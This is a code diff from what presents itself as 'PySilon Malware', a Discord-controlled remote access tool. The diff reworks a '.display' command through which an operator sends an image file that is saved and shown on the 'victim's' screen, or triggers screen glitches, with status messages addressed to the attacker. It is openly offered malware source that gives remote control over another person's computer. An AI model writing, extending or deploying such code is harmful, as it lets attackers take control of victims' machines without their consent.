@@ -1,4 +1,3 @@
-from PIL import Image, ImageDraw
 import win32print
 import win32gui
 import win32con
@@ -7,7 +6,6 @@ import random
 import math
 import json
 import time
-import os
 
 @client.command(name='display')
 async def screen_manipulation(ctx, option=None):
@@ -15,44 +13,44 @@ async def screen_manipulation(ctx, option=None):
     if option == 'graphic':
         embed = discord.Embed(title='📤 Provide a file containing graphic', description='Send your .drawdata file here', colour=discord.Colour.blue())
         embed.set_author(name='PySilon Malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
-        await ctx.channel.send(embed=embed)
-        expectation = 'graphic_file'
-        
+        await ctx.send(embed=embed)
+        def check(m):
+            return m.attachments and m.channel == ctx.channel
+
+        msg = await client.wait_for('message', check=check)
+        try:
+            filename = msg.attachments[0].filename
+            if filename.endswith('.drawdata'):
+                await msg.attachments[0].save(fp=filename)
+
+                screen_manipulator(filename).display_graphic(10)
+
+                embed = discord.Embed(title='🟢 Graphic successfully displayed', description='Victim should see it on their screen for 10 seconds.', colour=discord.Colour.green())
+                embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
+                await ctx.send(embed=embed)
+            else: ctx.send("File is not a *.drawdata* file")
+        except Exception as err: 
+            await ctx.send(f'```❗ Something went wrong while fetching graphic file...\n{str(err)}```')
+
     elif option == 'glitch':
-        if ctx.message.content.strip() == '.display-glitch':
-            embed = discord.Embed(title="📛 Error",description='```Syntax: .display-glitch <glitch_name>\nTo list all currently available glitches, type .display-glitch list```', colour=discord.Colour.red())
-            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
-            reaction_msg = await ctx.send(embed=embed); await reaction_msg.add_reaction('🔴')
-        elif ctx.message.content[16:] == 'list':
+        if ctx.message.content[16:] == 'list':
             embed = discord.Embed(title="📃 List of currently available glitches:", description=f'- {"- ".join(flash_screen("list"))}\n`NOTE: This list will dramatically increase it\'s size in release v4.1`', colour=discord.Colour.blue())
             embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
-            reaction_msg = await ctx.send(embed=embed); await reaction_msg.add_reaction('🔴')
+            await ctx.send(embed=embed)
         elif ctx.message.content[16:] + '\n' in flash_screen('list'):
             flash_screen(ctx.message.content[16:])
             embed = discord.Embed(title="🟢 Glitch succesfully executed", description=f'Remember to ⭐ our repository', colour=discord.Colour.blue())
             embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
-            reaction_msg = await ctx.send(embed=embed); await reaction_msg.add_reaction('🔴')
+            await ctx.send(embed=embed)
         else:
-            embed = discord.Embed(title="📛 Error",description='```Invalid argument!```', colour=discord.Colour.red())
+            embed = discord.Embed(title="📛 Error",description='```Syntax: .display-glitch <glitch_name>\nTo list all currently available glitches, type .display-glitch list```', colour=discord.Colour.red())
             embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
-            reaction_msg = await ctx.message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
-
-    elif expectation == 'graphic_file':
-        try:
-            split_v1 = str(ctx.message.attachments).split("filename='")[1]
-            filename = str(split_v1).split("' ")[0]
-            #filename = f'C:\\Users\\{getuser()}\\' + filename
-            await ctx.message.attachments[0].save(fp=filename)
-
-            screen_manipulator(filename).display_graphic(10)
-
-            embed = discord.Embed(title='Graphic successfully displayed', description='Victim should see it on their screen for 10 seconds.\n`This functionality will be HUGELY improved in release v4.1`', colour=discord.Colour.green())
-            embed.set_author(name='PySilon Malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
             await ctx.send(embed=embed)
 
-        except Exception as err: 
-            await ctx.send(f'```❗ Something went wrong while fetching graphic file...\n{str(err)}```')
-            expectation = None
+    else:
+        embed = discord.Embed(title="📛 Error",description='```Syntax: .display <graphic / glitch>```', colour=discord.Colour.red())
+        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
+        await ctx.send(embed=embed)
 
 class screen_manipulator:
     def __init__(self, saved_file):
